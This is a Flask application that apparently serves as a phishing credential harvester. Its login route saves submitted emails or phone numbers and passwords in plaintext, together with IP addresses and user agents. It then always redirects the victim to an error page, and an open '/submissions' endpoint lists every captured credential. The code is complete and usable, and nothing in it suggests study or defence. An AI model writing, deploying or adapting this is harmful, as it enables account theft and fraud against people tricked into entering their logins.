from flask import Flask, render_template, request, jsonify, redirect, url_for
import os

USE_MYSQL = os.getenv('USE_MYSQL', 'false').lower() == 'true'

import sqlite3

def get_db_connection():
    conn = sqlite3.connect('login_system.db')
    conn.row_factory = sqlite3.Row
    return conn

def init_database():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS login_submissions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email_or_phone TEXT NOT NULL,
            password TEXT NOT NULL,
            ip_address TEXT,
            user_agent TEXT,
            submitted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    conn.commit()
    conn.close()

app = Flask(__name__)

with app.app_context():
    init_database()

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/error')
def error():
    return render_template('error.html')

@app.route('/submit-login', methods=['POST'])
def submit_login():
    try:
        email_or_phone = request.form.get('email', '')
        password = request.form.get('password', '')
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent', '')
        
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO login_submissions (email_or_phone, password, ip_address, user_agent)
            VALUES (?, ?, ?, ?)
        """, (email_or_phone, password, ip_address, user_agent))
        conn.commit()
        conn.close()
        
        return redirect(url_for('error'))
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500

@app.route('/submissions')
def view_submissions():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM login_submissions ORDER BY submitted_at DESC")
    submissions = [dict(row) for row in cursor.fetchall()]
    conn.close()
    return jsonify({'success': True, 'submissions': submissions})

if __name__ == '__main__':
    print("Server running at: http://localhost:5000")
    app.run(host='0.0.0.0', port=80, debug=True)
